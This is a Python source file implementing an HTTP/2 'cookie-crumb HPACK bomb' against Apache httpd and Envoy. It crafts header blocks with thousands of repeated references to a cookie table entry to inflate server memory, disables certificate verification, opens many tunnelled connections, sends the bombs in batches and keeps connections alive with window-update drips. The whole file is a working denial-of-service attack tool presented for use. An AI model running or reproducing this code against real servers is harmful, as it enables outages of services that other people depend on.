"""Enhanced cookie-crumb HPACK bomb for httpd and Envoy."""
from __future__ import annotations

import ssl
import struct
import threading
import time
from dataclasses import dataclass

from attack_config import CookieAttackConfig

CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
FRAME_HEADERS = 0x1
FRAME_SETTINGS = 0x4
FRAME_PING = 0x6
FRAME_GOAWAY = 0x7
FRAME_WINDOW_UPDATE = 0x8
FRAME_CONTINUATION = 0x9
FLAG_ACK = 0x1
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4
SETTINGS_INITIAL_WINDOW_SIZE = 0x4
SOCKET_TIMEOUT = 300
MIN_BOMB_WIRE = 100


def h2_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    return (
        len(payload).to_bytes(3, "big")
        + bytes([frame_type, flags])
        + struct.pack("!I", stream_id & 0x7FFFFFFF)
        + payload
    )


def hpack_int(value: int, prefix_bits: int, first_byte_prefix: int) -> bytes:
    max_prefix = (1 << prefix_bits) - 1
    if value < max_prefix:
        return bytes([first_byte_prefix | value])
    out = bytearray([first_byte_prefix | max_prefix])
    value -= max_prefix
    while value >= 128:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def hpack_string(data: bytes) -> bytes:
    return hpack_int(len(data), 7, 0x00) + data


def indexed(index: int) -> bytes:
    return hpack_int(index, 7, 0x80)


def literal_indexed_name_with_indexing(name_index: int, value: bytes) -> bytes:
    return hpack_int(name_index, 6, 0x40) + hpack_string(value)


def literal_indexed_name_without_indexing(name_index: int, value: bytes) -> bytes:
    return hpack_int(name_index, 4, 0x00) + hpack_string(value)


def build_httpd_block(authority: str, path: str, refs: int) -> bytes:
    block = bytearray()
    block += indexed(2)
    block += indexed(7)
    block += literal_indexed_name_without_indexing(4, path.encode())
    block += literal_indexed_name_without_indexing(1, authority.encode())
    block += literal_indexed_name_with_indexing(32, b"")
    block += indexed(62) * refs
    return bytes(block)


def build_httpd_fat_block(authority: str, path: str, refs: int, cookie_value_size: int) -> bytes:
    """Fat-cookie variant for patched mod_http2 — non-empty crumbs count but still amplify."""
    cookie_value = b"x" * cookie_value_size
    block = bytearray()
    block += indexed(2)
    block += indexed(7)
    block += literal_indexed_name_without_indexing(4, path.encode())
    block += literal_indexed_name_without_indexing(1, authority.encode())
    block += literal_indexed_name_with_indexing(32, cookie_value)
    block += indexed(62) * refs
    return bytes(block)


def build_envoy_block(authority: str, cookie_value_size: int, refs: int) -> bytes:
    cookie_value = b"x" * cookie_value_size
    block = bytearray()
    block += indexed(2)
    block += indexed(7)
    block += indexed(4)
    block += literal_indexed_name_without_indexing(1, authority.encode())
    block += literal_indexed_name_with_indexing(32, cookie_value)
    block += indexed(62) * refs
    return bytes(block)


def build_block(cfg: CookieAttackConfig, host: str) -> bytes:
    sni = cfg.server_name or host
    if cfg.variant == "httpd":
        if cfg.cookie_value_size > 0:
            return build_httpd_fat_block(sni, cfg.path, cfg.refs, cfg.cookie_value_size)
        return build_httpd_block(sni, cfg.path, cfg.refs)
    return build_envoy_block(sni, cfg.cookie_value_size, cfg.refs)


def recv_exact(sock: ssl.SSLSocket, n: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < n:
        chunk = sock.recv(n - len(chunks))
        if not chunk:
            raise EOFError("closed")
        chunks += chunk
    return bytes(chunks)


def read_frame(sock: ssl.SSLSocket) -> tuple[int, int, int, bytes]:
    hdr = recv_exact(sock, 9)
    length = int.from_bytes(hdr[:3], "big")
    return hdr[3], hdr[4], struct.unpack("!I", hdr[5:9])[0] & 0x7FFFFFFF, recv_exact(sock, length)


def service_peer(sock: ssl.SSLSocket, seconds: float) -> None:
    deadline = time.monotonic() + seconds
    sock.settimeout(0.1)
    while time.monotonic() < deadline:
        try:
            ftype, flags, _, payload = read_frame(sock)
        except (TimeoutError, ssl.SSLError):
            continue
        except (EOFError, OSError):
            break
        if ftype == FRAME_SETTINGS and not (flags & FLAG_ACK):
            sock.sendall(h2_frame(FRAME_SETTINGS, FLAG_ACK, 0, b""))
        elif ftype == FRAME_PING and not (flags & FLAG_ACK):
            sock.sendall(h2_frame(FRAME_PING, FLAG_ACK, 0, payload))


def send_header_block(sock: ssl.SSLSocket, stream_id: int, block: bytes) -> int:
    chunks = [block[i : i + 16384] for i in range(0, len(block), 16384)] or [b""]
    wire = 0
    for i, chunk in enumerate(chunks):
        ftype = FRAME_HEADERS if i == 0 else FRAME_CONTINUATION
        flags = (FLAG_END_STREAM if i == 0 else 0) | (FLAG_END_HEADERS if i == len(chunks) - 1 else 0)
        frame = h2_frame(ftype, flags, stream_id, chunk)
        sock.sendall(frame)
        wire += len(frame)
    return wire


def drip_window(sock: ssl.SSLSocket, stream_ids: list[int], amount: int) -> None:
    payload = struct.pack("!I", amount & 0x7FFFFFFF)
    sock.sendall(h2_frame(FRAME_WINDOW_UPDATE, 0, 0, payload))
    for sid in stream_ids:
        sock.sendall(h2_frame(FRAME_WINDOW_UPDATE, 0, sid, payload))


@dataclass
class CookieConn:
    conn_id: int
    sock: ssl.SSLSocket | None = None
    stream_ids: list[int] | None = None
    active: bool = False
    wire: float = 0.0

    def close(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass


def connect_cookie(host: str, port: int, cfg: CookieAttackConfig) -> CookieConn:
    from tunnel import create_connection as tunnel_connect

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = tunnel_connect(host, port, timeout=SOCKET_TIMEOUT)
    sock = ctx.wrap_socket(raw, server_hostname=cfg.server_name or host)
    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError(f"ALPN {sock.selected_alpn_protocol()!r}")
    sock.sendall(CLIENT_PREFACE)
    settings = struct.pack("!HI", SETTINGS_INITIAL_WINDOW_SIZE, 0)
    sock.sendall(h2_frame(FRAME_SETTINGS, 0, 0, settings))
    service_peer(sock, 1.0)
    return CookieConn(conn_id=0, sock=sock, stream_ids=[], active=True)


def bomb_one(conn: CookieConn, block: bytes, cfg: CookieAttackConfig) -> tuple[bool, float]:
    assert conn.sock is not None
    stream_ids = [1 + 2 * i for i in range(cfg.streams)]
    wire = 0.0
    for sid in stream_ids:
        wire += send_header_block(conn.sock, sid, block)
    conn.stream_ids = stream_ids
    conn.wire = wire
    service_peer(conn.sock, 0.3)
    return wire >= MIN_BOMB_WIRE, wire


def hold_cookie(conn: CookieConn, cfg: CookieAttackConfig) -> None:
    if cfg.hold <= 0 or cfg.hold_mode in ("fire_and_forget", "none"):
        return
    assert conn.sock and conn.stream_ids
    sock = conn.sock
    if cfg.hold_mode == "hard_hold" and cfg.drip > 0:
        stop = time.monotonic() + cfg.hold
        while time.monotonic() < stop and conn.active:
            service_peer(sock, min(cfg.drip, stop - time.monotonic()))
            try:
                drip_window(sock, conn.stream_ids, cfg.drip_bytes)
            except OSError:
                conn.active = False
                break
    elif cfg.drip > 0:
        stop = time.monotonic() + cfg.hold
        while time.monotonic() < stop and conn.active:
            service_peer(sock, min(float(cfg.drip), stop - time.monotonic()))
            try:
                drip_window(sock, conn.stream_ids, cfg.drip_bytes)
            except OSError:
                conn.active = False
                break


def establish_cookie(
    host: str,
    port: int,
    count: int,
    cfg: CookieAttackConfig,
    bind_ips: list[str | None] | None = None,
    server_name: str | None = None,
) -> list[CookieConn]:
    del bind_ips  # cookie PoCs use single source IP; reserved for API parity
    sni = server_name or cfg.server_name or host
    cfg = CookieAttackConfig(**{**cfg.to_extra(), "server_name": sni})
    conns: list[CookieConn] = []
    lock = threading.Lock()

    def worker(i: int):
        c = CookieConn(conn_id=i)
        try:
            got = connect_cookie(host, port, cfg)
            c.sock = got.sock
            c.active = True
            with lock:
                conns.append(c)
        except Exception:
            c.close()

    threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(count)]
    for i, t in enumerate(threads):
        t.start()
        if i + 1 < count:
            time.sleep(cfg.conn_stagger_sec)
    for t in threads:
        t.join(timeout=SOCKET_TIMEOUT)
    for i, c in enumerate(conns):
        c.conn_id = i
    return conns


def bomb_connections_cookie(
    host: str,
    conns: list[CookieConn],
    cfg: CookieAttackConfig,
    block: bytes,
) -> tuple[int, float, list[str]]:
    ok = 0
    wire = 0.0
    errors: list[str] = []
    lock = threading.Lock()

    def do_one(c: CookieConn):
        nonlocal ok, wire
        try:
            success, w = bomb_one(c, block, cfg)
            with lock:
                wire += w
                if success:
                    ok += 1
                else:
                    errors.append(f"conn{c.conn_id}:wire_small")
        except Exception as exc:
            errors.append(f"conn{c.conn_id}:{exc}")
            c.active = False

    batch = cfg.bomb_batch_size or 12
    if cfg.bomb_mode == "batched" or batch > 0:
        for i in range(0, len(conns), batch):
            chunk = conns[i : i + batch]
            threads = [threading.Thread(target=do_one, args=(c,), daemon=True) for c in chunk]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=SOCKET_TIMEOUT)
            if i + batch < len(conns) and cfg.bomb_batch_gap_sec > 0:
                time.sleep(cfg.bomb_batch_gap_sec)
    else:
        for c in conns:
            do_one(c)

    return ok, wire, errors


def hold_connections_cookie(conns: list[CookieConn], cfg: CookieAttackConfig) -> int:
    threads = [
        threading.Thread(target=hold_cookie, args=(c, cfg), daemon=True)
        for c in conns if c.active
    ]
    for t in threads:
        t.start()
    timeout = cfg.hold + cfg.drip + 90
    for t in threads:
        t.join(timeout=timeout)
    return sum(1 for c in conns if c.active)


def run_cookie_attack_pipeline(
    host: str,
    port: int,
    connections: int,
    cfg: CookieAttackConfig,
) -> tuple[int, int, float, list[str]]:
    block = build_block(cfg, host)
    conns = establish_cookie(host, port, connections, cfg)
    established = len(conns)
    bomb_ok, wire, errors = bomb_connections_cookie(host, conns, cfg, block)
    if cfg.hold > 0:
        hold_connections_cookie(conns, cfg)
    close_cookie_connections(conns)
    return established, bomb_ok, wire, errors


def bomb_connections_batched(
    conns: list[CookieConn],
    cfg: CookieAttackConfig,
    server_name: str | None = None,
) -> tuple[int, float, list[str]]:
    sni = server_name or cfg.server_name or ""
    block = build_block(cfg, sni or "localhost")
    return bomb_connections_cookie(sni, conns, cfg, block)


def hold_cookie_connections(conns: list[CookieConn], cfg: CookieAttackConfig) -> int:
    return hold_connections_cookie(conns, cfg)


def close_cookie_connections(conns: list[CookieConn]) -> None:
    for c in conns:
        c.close()
